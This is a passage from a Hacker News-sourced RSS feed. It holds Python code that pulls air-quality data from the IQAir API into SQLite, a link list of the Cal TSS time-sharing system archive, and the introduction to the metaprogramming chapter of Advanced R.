	statement <span>=</span> f<span>'INSERT OR REPLACE INTO AirQualityData (Timestamp, IndoorTemperature, IndoorHumidity, OutdoorTemperature, OutdoorPressure, OutdoorHumidity, OutdoorWindSpeed, OutdoorWindDirection, OutdoorWeatherIcon, IndoorPM25AQI, IndoorPM25Concentration, IndoorCO2Color, IndoorCO2Concentration, IndoorPM10AQI, IndoorPM10Concentration, IndoorPM1AQI, IndoorPM1Concentration, OutdoorAQI, OutdoorPollutant, OutdoorConcentration) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'</span>

	<span>for</span> measurement <span>in</span> measurements:
		pst <span>=</span> pytz<span>.</span>timezone(<span>'US/Pacific'</span>)

		target_date <span>=</span> dateutil<span>.</span>parser<span>.</span>parse(measurement<span>.</span>timestamp)
		localized_timestamp <span>=</span> target_date<span>.</span>astimezone(pst)

		data_connection<span>.</span>execute(statement, (localized_timestamp<span>.</span>isoformat(), measurement<span>.</span>indoor_temperature, measurement<span>.</span>indoor_humidity, measurement<span>.</span>outdoor_temperature, measurement<span>.</span>outdoor_pressure, measurement<span>.</span>outdoor_humidity, measurement<span>.</span>outdoor_wind_speed,
			measurement<span>.</span>outdoor_wind_direction, measurement<span>.</span>outdoor_weather_icon, measurement<span>.</span>indoor_pm25_aqi, measurement<span>.</span>indoor_pm25_concentration, measurement<span>.</span>indoor_co2_color, measurement<span>.</span>indoor_co2_concentration,
			measurement<span>.</span>indoor_pm10_aqi, measurement<span>.</span>indoor_pm10_concentration, measurement<span>.</span>indoor_pm1_aqi, measurement<span>.</span>indoor_pm1_concentration, measurement<span>.</span>outdoor_aqi, measurement<span>.</span>outdoor_pollutant, measurement<span>.</span>outdoor_concentration))
		data_connection<span>.</span>commit()

	data_connection<span>.</span>close()
</code></pre></td></tr></tbody></table>
</div>
</div><p>Feel free to ignore some timezone changes - the default values returned by the IQAir services are in UTC, and I wanted them stored in PST for ease of processing. You could entirely skip this step, and delegate that work to the future rendering/analysis layer.</p>
<p>With the above, the data acquisition function should be referred to as the “parse a metric crapton of JSON” function that takes the data and places it inside an object:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>  1
</span><span>  2
</span><span>  3
</span><span>  4
</span><span>  5
</span><span>  6
</span><span>  7
</span><span>  8
</span><span>  9
</span><span> 10
</span><span> 11
</span><span> 12
</span><span> 13
</span><span> 14
</span><span> 15
</span><span> 16
</span><span> 17
</span><span> 18
</span><span> 19
</span><span> 20
</span><span> 21
</span><span> 22
</span><span> 23
</span><span> 24
</span><span> 25
</span><span> 26
</span><span> 27
</span><span> 28
</span><span> 29
</span><span> 30
</span><span> 31
</span><span> 32
</span><span> 33
</span><span> 34
</span><span> 35
</span><span> 36
</span><span> 37
</span><span> 38
</span><span> 39
</span><span> 40
</span><span> 41
</span><span> 42
</span><span> 43
</span><span> 44
</span><span> 45
</span><span> 46
</span><span> 47
</span><span> 48
</span><span> 49
</span><span> 50
</span><span> 51
</span><span> 52
</span><span> 53
</span><span> 54
</span><span> 55
</span><span> 56
</span><span> 57
</span><span> 58
</span><span> 59
</span><span> 60
</span><span> 61
</span><span> 62
</span><span> 63
</span><span> 64
</span><span> 65
</span><span> 66
</span><span> 67
</span><span> 68
</span><span> 69
</span><span> 70
</span><span> 71
</span><span> 72
</span><span> 73
</span><span> 74
</span><span> 75
</span><span> 76
</span><span> 77
</span><span> 78
</span><span> 79
</span><span> 80
</span><span> 81
</span><span> 82
</span><span> 83
</span><span> 84
</span><span> 85
</span><span> 86
</span><span> 87
</span><span> 88
</span><span> 89
</span><span> 90
</span><span> 91
</span><span> 92
</span><span> 93
</span><span> 94
</span><span> 95
</span><span> 96
</span><span> 97
</span><span> 98
</span><span> 99
</span><span>100
</span><span>101
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>def</span> <span>GetMeasurementData</span>(api_key, device_id):
	url <span>=</span> f<span>'https://app-api.airvisual.com/api/v5/devices/{device_id}/measurements'</span>

	headers <span>=</span> {
		<span>'x-api-token'</span>: api_key
	}

	response <span>=</span> requests<span>.</span>request(<span>'GET'</span>, url, headers<span>=</span>headers)

	<span>try</span>:
		raw_data <span>=</span> json<span>.</span>loads(response<span>.</span>text)

		measurements <span>=</span> []

		weather_measurements_count <span>=</span> <span>len</span>(raw_data[<span>'data'</span>][<span>'hourlyWeathers'</span>])
		device_measurements_count <span>=</span> <span>len</span>(raw_data[<span>'data'</span>][<span>'hourlyMeasurements'</span>])

		<span>print</span>(f<span>'[info] There are {weather_measurements_count} weather measurements.'</span>)
		<span>print</span>(f<span>'[info] There are {device_measurements_count} device measurements.'</span>)

		measurements <span>=</span> []
		<span># Ideally, the assumption is that weather measurements are the same number</span>
		<span># as device measurements. We will test this assumption as the tool is used.</span>
		<span># In this case, I chose the first array in the returned JSON as the baseline.</span>
		<span>for</span> measurement <span>in</span> raw_data[<span>'data'</span>][<span>'hourlyWeathers'</span>]:
			timestamp <span>=</span> <span>''</span>
			indoor_temperature <span>=</span> <span>''</span>
			indoor_humidity <span>=</span> <span>''</span>
			outdoor_temperature <span>=</span> <span>''</span>
			outdoor_pressure <span>=</span> <span>''</span>
			outdoor_humidity <span>=</span> <span>''</span>
			outdoor_wind_speed <span>=</span> <span>''</span>
			outdoor_wind_direction <span>=</span> <span>''</span>
			outdoor_weather_icon <span>=</span> <span>''</span>
			indoor_pm25_aqi <span>=</span> <span>''</span>
			indoor_pm25_concentration <span>=</span> <span>''</span>
			indoor_pm10_aqi <span>=</span> <span>''</span>
			indoor_pm10_concentration <span>=</span> <span>''</span>
			indoor_pm1_aqi <span>=</span> <span>''</span>
			indoor_pm1_concentration <span>=</span> <span>''</span>
			indoor_co2_color <span>=</span> <span>''</span>
			indoor_co2_concentration <span>=</span> <span>''</span>
			outdoor_aqi <span>=</span> <span>''</span>
			outdoor_concentration <span>=</span> <span>''</span>
			outdoor_pollutant <span>=</span> <span>''</span>

			timestamp <span>=</span> measurement[<span>'ts'</span>]
			indoor_temperature <span>=</span> measurement[<span>'temperature'</span>]
			indoor_humidity <span>=</span> measurement[<span>'humidity'</span>]

			<span>if</span> <span>'outdoor'</span> <span>in</span> measurement:
				outdoor_temperature <span>=</span> measurement[<span>'outdoor'</span>][<span>'temperature'</span>]
				outdoor_pressure <span>=</span> measurement[<span>'outdoor'</span>][<span>'pressure'</span>]
				outdoor_humidity <span>=</span> measurement[<span>'outdoor'</span>][<span>'humidity'</span>]
				outdoor_wind_speed <span>=</span> measurement[<span>'outdoor'</span>][<span>'windSpeed'</span>]
				outdoor_wind_direction <span>=</span> measurement[<span>'outdoor'</span>][<span>'windDirection'</span>]
				outdoor_weather_icon <span>=</span> measurement[<span>'outdoor'</span>][<span>'weatherIcon'</span>]

			device_measurement <span>=</span> [x <span>for</span> x <span>in</span> raw_data[<span>'data'</span>][<span>'hourlyMeasurements'</span>] <span>if</span> x[<span>'ts'</span>] <span>==</span> timestamp][<span>0</span>]

			indoor_pm25_measurement <span>=</span> [x <span>for</span> x <span>in</span> device_measurement[<span>'pollutants'</span>] <span>if</span> x[<span>'pollutant'</span>]<span>.</span>lower() <span>==</span> <span>'pm25'</span>][<span>0</span>]
			indoor_pm25_aqi <span>=</span> indoor_pm25_measurement[<span>'aqius'</span>]
			indoor_pm25_concentration <span>=</span> …</code></pre></td></tr></tbody></table></div></div></section></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://den.dev/blog/air/">https://den.dev/blog/air/</a></em></p>]]>
            </description>
            <link>https://den.dev/blog/air/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25571580</guid>
            <pubDate>Tue, 29 Dec 2020 16:39:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cal TSS Archives]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25571179">thread link</a>) | @crueltear
<br/>
December 29, 2020 | https://www.mcjones.org/CalTSS/ | <a href="https://web.archive.org/web/*/https://www.mcjones.org/CalTSS/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

   

<div>
<!--l. 119--><p><img src="https://www.mcjones.org/CalTSS/image/Team.jpg" width="356" height="257" alt="CalTSS Developers at the 1991 reunion">
<!--l. 123--></p><p>December 14, 1991 reunion.
    Left to right: Redell, Gray, Vaughan, McDaniel, Lindsay, McJones, Simonyi, Lampson.
<!--l. 128--></p></div>                                                                         
                                                                          
   <h3>Contents</h3>
       <ol>
            <li><a href="#sec1_Doc">TSS design notes, documentation, etc.</a></li>
               <ol type="i">
                    <li><a href="#sec1_Basic">"A basic time sharing system"</a></li>
                    <li><a href="#sec1_Designing_ECS">Designing the ECS system</a></li>
                    <li><a href="#sec1_ECS_runs">The ECS system begins to run</a></li>
		    <li><a href="#sec1_Designing_Disk_system">Designing the disk system</a></li>
		    <li><a href="#sec1_Disk_system_runs">The disk system begins to run</a></li>
                    <li><a href="#sec1_Discontinued">Development is discontinued</a></li>

                    <li><a href="#sec1_Afterward">Afterward</a></li>
                </ol>

            <li><a href="#sec2_Source">Source code</a></li> 
            <li><a href="#sec3_Theses">Theses</a></li>
            <li><a href="#sec4_Papers">Papers</a></li>
            <li><a href="#sec5_Hardware">Hardware</a></li>
            <li><a href="#sec6_People">People</a></li>
       </ol>
       <ul>
            <li><a href="#sec7_Ref">References</a></li>
       </ul>
                                                               
                                                                          
   <h3><a name="sec1_Doc"></a>1 TSS design notes, documentation, etc.</h3>

   <h4><a name="sec1_Basic"></a>1.i "A basic time sharing system"</h4>

    The first documents, by Howard Sturgis, take up various aspects of a time-sharing
    system (including process scheduling, a disk-based file system, low-speed terminal i/o,
    and capabilities), but don't mention subprocesses and (multilevel) operations.
    <em>Was Howard working alone, or with Butler?</em>
    
      <ol>

	<li>Sturgis. November 15, 1967.
		<em>"What follows is a description of a basic time sharing system,
			as seen by a knowledgeable user."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/671115-hes.pdf">671115-hes</a></li>
          
        <li>Sturgis. February 20, 1968.
          <em>"This is the proposed body of a letter from Prof. Graham to myself (HES). He wants approval or comments from Ken Hebert [and] Gene Albright. Phase 1: Design; Phase 2: Limited System; Phase III: Better System." </em>
          <a href="https://www.mcjones.org/CalTSS/archive/680220-mhg_to_hes.pdf">680220-mhg_to_hes</a></li>
          
      	<li>Sturgis. February 27, 1968. <em>Early disk file system notes.</em>
          <a href="https://www.mcjones.org/CalTSS/archive/680227-hes.pdf">680227-hes</a></li>

	<li>Sturgis. February 28, 1968. <em>More early disk file system notes.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680228-hes.pdf">680228-hes</a></li>

	<li>Sturgis. February 29, 1968. <em>Capabilities, basic objects.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680229a-hes.pdf">680229a-hes</a></li>

	<li>Sturgis. February 29, 1968. <em>Calculations based on size of 6638 disk.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680229b-hes.pdf">680229b-hes</a></li>
                                      
	<li>Sturgis. March 3, 1968. <em>Notes on disk file representation.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680303-hes.pdf">680303-hes</a></li>

	<li>Sturgis. March 4, 1968. <em>More notes on disk file representation.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680304-hes.pdf">680304-hes</a></li>
    </ol>

   <h4><a name="sec1_Designing_ECS"></a>1.ii Designing the ECS system</h4>

    In the next series of documents, by Howard Sturgis, Butler Lampson, and Bruce
    Lindsay, Cal TSS begins to take shape: swapping controlled by a map, errors and
    interrupts, and more...

    <ol start="9">
	<li>Sturgis. July 14, 1968. <em>Map, operation, capability, objects.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680714-hes.pdf">680714-hes</a></li>

	<li>Sturgis. July 16, 1968. <em>Process, subprocess.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680716-hes.pdf">680716-hes</a></li>

      	<li>Lampson. July 18, 1968. <em>Allocate ECS as follows: ...</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680718-bwl.pdf">680718-bwl</a></li>
                                                                          
      	<li>Lampson. "Scope  compatibility  for  symbolic  file."  1968?
		<em>Sample code and timing for conversion from eight seven-bit ASCII characters per word
		to ten six-bit Display Code characters per word. The estimate was nine microseconds
		per character.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/scope-compat-bwl.pdf">scope-compat-bwl</a></li>

      	<li>Sturgis. July 18, 1968. <em>"Allocate fixed peripherals by list scheme ..."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680718-hes.pdf">680718-hes</a></li>

      	<li>Sturgis. August 22, 1968. <em>"For each subprocess ..."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680822-hes.pdf">680822-hes</a></li>

	<li>Sturgis. September 3, 1968. <em>"Sensitive code versus interrupt routines ..."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680903-hes.pdf">680903-hes</a></li>

	<li>Sturgis. "ECS System structure." September 5, 1968.
		<a href="https://www.mcjones.org/CalTSS/archive/680905-hes.pdf">680905-hes</a></li>

	<li>Sturgis. "Modification of operation." September 10, 1968. <em>"See 7/14/68."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/680910-hes.pdf">680910-hes</a></li>

        <li>Lindsay. "Subprocess error handler." September 11, 1968.
		<a href="https://www.mcjones.org/CalTSS/archive/680911-bgl.pdf">680911-bgl</a></li>

      	<li>Lampson. "Swapping and charge for ECS." September 11, 1968.
		<a href="https://www.mcjones.org/CalTSS/archive/680911-bwl.pdf">680911-bwl</a></li>

      	<li>Sturgis. "Error handling." September 11, 1968.
		<a href="https://www.mcjones.org/CalTSS/archive/680911-hes.pdf">680911-hes</a></li>

      	<li>Sturgis. "Process." September 19, 1968.
		<a href="https://www.mcjones.org/CalTSS/archive/680919-hes.pdf">680919-hes</a></li>

	<li>Sturgis. October 3, 1968. <em>Event channel algorithms.</em>
                <a href="https://www.mcjones.org/CalTSS/archive/681003-hes.pdf">681003-hes</a></li>

    </ol>

	<em>I believe there must have been more design memos written by Howard and perhaps others.
		When did the idea of multilevel operations emerge?</em>

    <ol start="23">

      	<li>Sturgis. "Disk representation of file." May 1, 1969.
		<a href="https://www.mcjones.org/CalTSS/archive/690501-hes.pdf">690501-hes</a></li>
                                                                          
      	<li>Standiford? "Option bit assignments." August 20, 1969.
		<em>Table of option bit assignments for the various object types.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/690820-opt-bit-assign.pdf">690820-opt-bit-assign</a></li>
    </ol>

   <h4><a name="sec1_ECS_runs"></a>1.iii The ECS system begins to run</h4>

    <em>When was the "two-teletype demo"?</em>

    <ol start="25">

	<li>Malbrain. "The Bead." Circa Fall 1969.
		<em>"The Bead is the first subprocess created in every process when the system is initialized.
		Its function is to act as an interim monitor package to coordinate file activity and naming,
		elementary utilities, and be a command processor for the user."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/bead-km.pdf">bead-km</a></li>

	<li>—. TS Interrupt System September 2, 1969. <em>Typewritten documentation.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/690902-int-sys.pdf">690902-int-sys</a></li>

	<li>Lampson. An Overview of the CAL Time-Sharing System. October 10, 1969.
		<em>Reprint of [<a href="#Lam69">Lam69</a>], with a progress report
		(similar to Gray, October 11, 1969) appended.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/691010-overview-bwl.pdf">691010-overview-bwl</a></li>

	<li>Gray. Progress Report on 6400 CAL Time-Sharing System.  October 11, 1969.                   <a href="https://www.mcjones.org/CalTSS/archive/691011-progress-jng.pdf">691011-progress-jng</a></li>
                                                                                                             
	<li>—. CAL Time-Sharing System Users Guide. November 1969.
		<em>Actually, this is the programmers guide.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/6911-users-guide.pdf">6911-users-guide</a></li>

	<li>—. CAL-TSS Internals Manual. November 1969.
		<a href="https://www.mcjones.org/CalTSS/archive/6911-internals.pdf">6911-internals</a></li>

    <li>—. Preliminary SCOPE Manual. November 5, 1969.
		<em>The SCOPE simulator made it possible to run programs designed for
		    CDC's SCOPE batch system.</em>
        <a href="https://www.mcjones.org/CalTSS/archive/691105-scope-prelim.pdf">691105-scope-prelim</a></li>

	<li>—. TSS Printer Driver November 5, 1969.
		<a href="https://www.mcjones.org/CalTSS/archive/691105-print-driv.pdf">691105-print-driv</a></li>

	<li>Standiford. "TSS Display Driver." Late 1969?
		<a href="https://www.mcjones.org/CalTSS/archive/69-disp-driv-ks.pdf">69-disp-driv-ks</a></li>

	<li>—.  "S-device user interface."  November 5, 1969.
		<em>Specification of device interface to be used for tape drives, printers, card readers,
		card punches, and the console display.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/691105-s-dev.pdf">691105-s-dev</a></li>
                                                                          
	<li>—. The BEAD Users Guide. December 18, 1969.
		<a href="https://www.mcjones.org/CalTSS/archive/691218-bead-ug.pdf">691218-bead-ug</a></li>
        
    <li>Karl Malbrain and Paul McJones. COOL-AID. 1969?
        <em>Reference manual for unfinished PL/360-like assembler.</em>
        <a href="https://www.mcjones.org/CalTSS/archive/69-COOL-AID-km-prm.pdf">69-COOL-AID-km-prm</a></li>

	<li>—. SCOPE Manual. January 21, 1970.
		<em>"This document describes the SCOPE simulator under the interim system.
		A knowledge of the SCOPE 3.1 manual is assumed."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700121-scope.pdf">700121-scope</a></li>

	<li>Gray. (Lack of Visible) Progress Report: CAL-6400-TSS. January 15, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700115-progress-jng.pdf">700115-progress-jng</a></li>

	<li>Malbrain. "SCOPE 3.0." 1970?
		<a href="https://www.mcjones.org/CalTSS/archive/scope-30-km.pdf">scope-30-km</a></li>

	<li>Malbrain. "Proposal for batch system." Early 1970?
		<em>Early proposal for simple batch system: no tapes or job queuing;
		low-level disk system to be implemented below the Bead; SNOBOL program used for ?</em>
		<a href="https://www.mcjones.org/CalTSS/archive/batch-proposal-km.pdf">batch-proposal-km</a></li>

	<li>Vaughan. "Interrupts." 1970? <em>Notes for redesign.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/70-interrupt-redesign-vv.pdf">70-interrupt-redesign-vv</a></li>
                                                                          
	<li>Lindsay. 1970?
		<em>Proposal for interrupt priorities based on magnitude of high-order part of class code.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/70-interrupt-proposal-bgl.pdf">70-interrupt-proposal-bgl</a></li>

	<li>Vaughan. "September system." 1970.
		<em>Notes on content of September system: low-level disk system, less swapping, pseudo-close,
		and space control; directory less subprocess descriptors, ECS goodies, global objects, and
		accounting; disk dump and load; command  processor and subprocess descriptors ("a  la  bead"),
		line collector, login, logout, and accounting; Scope simulator; disk recovery.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/70-sept-sys-vv.pdf">70-sept-sys-vv</a></li>

	<li>Gray. "[Addendum to] Systext standard." 1970?
		<a href="https://www.mcjones.org/CalTSS/archive/70-systext-changes-jng.pdf">70-systext-changes-jng</a></li>

    </ol>

   <h4><a name="sec1_Designing_Disk_system"></a>1.iv Designing the disk system</h4>

    <ol start="45">

	<li>Vaughan. "User interface, command processor, human engineering." 1970?
      		<em>Sets down requirements for mechanism for user to control time used by subsystem, etc.</em>                                                                		<a href="https://www.mcjones.org/CalTSS/archive/70-user-interface-vv.pdf">70-user-interface-vv</a></li>

 	<li>Sturgis. January 22, 1970.
		<em>"Objects in directories, note on ecs goodie, representation of files, directories,
		access keys, ecs goodies, directory structure for an entry, directory operations,
		subprocess descriptor."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700122-hes.pdf">700122-hes</a></li>
                                                                                                                                                    
	<li>Sturgis. "Subprocess descriptor." February 19, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700219a-hes.pdf">700219a-hes</a></li>

	<li>Sturgis. "Directory object descriptions." February 19, 1970.
		<em>"Implementation algorithms another time."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700219b-hes.pdf">700219b-hes</a></li>

	<li>Sturgis. "Tentative changes to ECS system." March 5, 1970.
		<em>Design notes for return parameter authorization.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700305a-hes.pdf">700305a-hes</a></li>

	<li>Sturgis. "[Global] ECS objects implementation." March 5, 1970.
		<em>Design notes for representing ECS objects in disk system directories.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700305b-hes.pdf">700305b-hes</a></li>

	<li>Sturgis. "ECS goodie implementation." March 5, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700305c-hes.pdf">700305c-hes</a></li>

	<li>Sturgis. "New ECS facility (version 3)." March 12, 1970.
		<em>Design notes for capability-creating authorizations.</em>                                           			<a href="https://www.mcjones.org/CalTSS/archive/700312a-hes.pdf">700312a-hes</a></li>                                                               
                                                                          
	<li>Sturgis. "New ECS facility." March 12, 1970.
		<em>More design notes for return parameter authorization and block data
		and capability parameters.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700312b-hes.pdf">700312b-hes</a></li>

	<li>Sturgis. "'Disk process' structure." March 19, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700319-hes.pdf">700319-hes</a></li>

	<li>Vaughan. "Evaluation of work yet to be done on the ECS system as
		of 30 March 70." March 30 and April 13, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700330-0413-vv.pdf">700330-0413-vv</a></li>

	<li>Gray. "Disk meeting." April 1, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700401-jng.pdf">700401-jng</a></li>

	<li>Vaughan. "Interrupts." April 2, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700402-vv.pdf">700402-vv</a></li>

	<li>Gray. CAL Progress Report. April 15, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700415-progress-jng.pdf">700415-progress-jng</a></li>
                                                                          
	<li>Sturgis. "General description of actions with respect to directories."
		April 17, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700417a-hes.pdf">700417a-hes</a></li>

	<li>Sturgis. "Directory structure." April 17, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700417b-hes.pdf">700417b-hes</a></li>

	<li>Sturgis. "Specific actions for directories." April 17, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700417c-hes.pdf">700417c-hes</a></li>

	<li>Vaughan. April 20, 1970. <em>Notes on various ECS system redesign issues.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700420-vv.pdf">700420-vv</a></li>

	<li>Sturgis. April 23, 1970.
		<em> "Open and close, general; directories; disk files;
		subprocess descriptors; access keys; global ECS object; ECS goodie."</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700423-hes.pdf">700423-hes</a></li>

	<li>Richard Brautigan. All Watched Over by Machines of Loving Grace.
		April 27, 1970.
		<em>Photocopied and distributed to the staff by Vaughan.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700427-brautigan-vv.pdf">700427-brautigan-vv</a></li>
                                                                          
                                                                          
	<li>Sturgis. "Subprocess descriptors." April 30, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700430-hes.pdf">700430-hes</a></li>

	<li>Vaughan. "Reconstituted list of things to be done on the ECS level of Cal TSS."
		June  1,  1970.
		<em>"Stuff  needed  for  the  operation  of  the  'September System'"</em>                                                                                        		<a href="https://www.mcjones.org/CalTSS/archive/700601-vv.pdf">700601-vv</a></li>
        
    <li>Gray. Progress Report - CAL-TSS. June 1, 1970.
        <em>"I am resigning as director of CAL effective today, Howard Sturgis who, along with Butler Lampson, was the principle architect of TSS i s replacing me. The job i s thankless, draining, mundane, and unpleasant."</em>
        <a href="https://www.mcjones.org/CalTSS/archive/700601-progress_report-jng.pdf%3E">700601-progress_report-jng</a></li>

	<li>Sturgis. "Dump-load." June 1, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700601-dump-load-hes.pdf">700601-dump-load-hes</a></li>

	<li>McJones. "Operations." June 3, 1970.
		<em>Operation data structure diagram.</em>
		<a href="https://www.mcjones.org/CalTSS/archive/700603-operations-prm.pdf">700603-operations-prm</a></li>

	<li>McJones. "Directory." June 29, 1970.
		<em>Preliminary  interface  specification and internal data structure.</em>                                                        	<a href="https://www.mcjones.org/CalTSS/archive/700629-prm.pdf">700629-prm</a></li>

	<li>Standiford. "TSS Display Driver - Revision A." July 6, 1970.
		<a href="https://www.mcjones.org/CalTSS/archive/700706-disp-driv-rev-a-ks.pdf">700706-disp-driv-rev-a-ks</a></li>
                                                                          
	<li>Morris. …</li></ol></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mcjones.org/CalTSS/">https://www.mcjones.org/CalTSS/</a></em></p>]]>
            </description>
            <link>https://www.mcjones.org/CalTSS/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25571179</guid>
            <pubDate>Tue, 29 Dec 2020 16:11:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Metaprogramming in R]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25571142">thread link</a>) | @dustingetz
<br/>
December 29, 2020 | https://adv-r.hadley.nz/metaprogramming.html | <a href="https://web.archive.org/web/*/https://adv-r.hadley.nz/metaprogramming.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="metaprogramming">


<p>One of the most intriguing things about R is its ability to do <strong>metaprogramming</strong>. This is the idea that code is data that can be inspected and modified programmatically. This is a powerful idea; one that deeply influences much R code. At the most basic level, it allows you to do things like write <code><a href="http://purrr.tidyverse.org/">library(purrr)</a></code> instead of <code><a href="http://purrr.tidyverse.org/">library("purrr")</a></code> and enable <code><a href="https://rdrr.io/r/graphics/plot.default.html">plot(x, sin(x))</a></code> to automatically label the axes with <code>x</code> and <code><a href="https://rdrr.io/r/base/Trig.html">sin(x)</a></code>. At a deeper level, it allows you to do things like use <code>y ~ x1 + x2</code> to represent a model that predicts the value of <code>y</code> from <code>x1</code> and <code>x2</code>, to translate <code><a href="https://rdrr.io/r/base/subset.html">subset(df, x == y)</a></code> into <code>df[df$x == df$y, , drop = FALSE]</code>, and to use <code><a href="https://dplyr.tidyverse.org/reference/filter.html">dplyr::filter(db, is.na(x))</a></code> to generate the SQL <code>WHERE x IS NULL</code> when <code>db</code> is a remote database table.</p>
<p>Closely related to metaprogramming is <strong>non-standard evaluation</strong>, NSE for short. This term, which is commonly used to describe the behaviour of R functions, is problematic in two ways. Firstly, NSE is actually a property of the argument (or arguments) of a function, so talking about NSE functions is a little sloppy. Secondly, it’s confusing to define something by what it’s not (standard), so in this book I’ll introduce more precise vocabulary.</p>
<p>Specifically, this book focuses on tidy evaluation (sometimes called tidy eval for short). Tidy evaluation is implemented in the rlang package,<span><a tabindex="0" data-toggle="popover" data-content="<p>Lionel Henry and Hadley Wickham, <em>Rlang: Tools for Low-Level R Programming</em>, 2018, <a href=&quot;https://rlang.r-lib.org&quot; role=&quot;doc-biblioref&quot;>https://rlang.r-lib.org</a>.</p>"><sup>84</sup></a></span> and I’ll use rlang extensively in these chapters. This will allow you to focus on the big ideas, without being distracted by the quirks of implementation that arise from R’s history. After I introduce each big idea with rlang, I’ll then circle back to talk about how those ideas are expressed in base R. This approach may seem backward to some, but it’s like learning how to drive using an automatic transmission rather than a stick shift: it allows you to focus on the big picture before having to learn the details. This book focusses on the theoretical side of tidy evaluation, so you can fully understand how it works from the ground up. If you are looking for a more practical introduction, I recommend the tidy evaluation book at <a href="https://tidyeval.tidyverse.org/">https://tidyeval.tidyverse.org</a><a tabindex="0" data-toggle="popover" data-content="<p>As I write this chapter, the tidy evaluation book is still a work-in-progress, but by the time you read this it will hopefully be finished.</p>"><sup>85</sup></a>.</p>
<p>You’ll learn about metaprogramming and tidy evaluation in the following five chapters:</p>
<ol>
<li><p>Chapter <a href="https://adv-r.hadley.nz/meta-big-picture.html#meta-big-picture">17</a> gives a high level description of the whole
metaprogramming story, briefly learning about all major components
and how they fit together to form a cohesive whole.</p></li>
<li><p>Chapter <a href="https://adv-r.hadley.nz/expressions.html#expressions">18</a> shows that that all R code can be described as a
tree. You’ll learn how to visualise these trees, how the rules of R’s
grammar convert linear sequences of characters into these trees, and how to
use recursive functions to work with code trees.</p></li>
<li><p>Chapter <a href="https://adv-r.hadley.nz/quasiquotation.html#quasiquotation">19</a> presents tools from rlang that you can use to
capture (quote) unevaluated function arguments. You’ll also learn about
quasiquotation, which provides a set of techniques to unquote input to make
it possible to easily generate new trees from code fragments.</p></li>
<li><p>Chapter <a href="https://adv-r.hadley.nz/evaluation.html#evaluation">20</a> moves on to evaluating captured code. Here you’ll
learn about an important data structure, the <strong>quosure</strong>, which ensures
correct evaluation by capturing both the code to evaluate, and the
environment in which to evaluate it. This chapter will show you how to put
all the pieces together to understand how NSE works in base R, and how to
write functions that work like <code><a href="https://rdrr.io/r/base/subset.html">subset()</a></code>.</p></li>
<li><p>Chapter <a href="https://adv-r.hadley.nz/translation.html#translation">21</a> finishes up by combining first-class environments, lexical
scoping, and metaprogramming to translate R code into other languages,
namely HTML and LaTeX.</p></li>
</ol>
</div></div>]]>
            </description>
            <link>https://adv-r.hadley.nz/metaprogramming.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25571142</guid>
            <pubDate>Tue, 29 Dec 2020 16:07:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Becoming a Startup Finance Quarterback with Eric Lesser]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25570921">thread link</a>) | @StriverGuy
<br/>
